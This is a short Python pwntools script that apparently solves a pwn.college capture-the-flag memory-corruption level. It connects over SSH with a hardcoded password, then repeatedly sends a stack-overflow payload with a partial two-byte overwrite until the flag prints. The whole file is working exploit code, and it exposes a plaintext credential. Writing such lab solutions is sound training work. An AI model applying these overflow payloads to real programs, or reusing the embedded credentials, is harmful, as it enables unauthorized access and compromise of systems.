from pwn import *

s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
# context.log_level = 0
while 1:
    p = s.run('/babymem_level9_testing2')

    pay = b'\x00'*0x20 + b'\x37' + 0x7479.to_bytes(2, 'little')
    p.sendlineafter(b'size: ',str(0x3A))
    p.sendafter(b'!\n',pay)

    try:   
        p.recvuntil(b'pwn_')
        print('pwn_' + p.recvuntil(b'}').decode())
        break
    except KeyboardInterrupt:
        exit(1)
    except:
        pass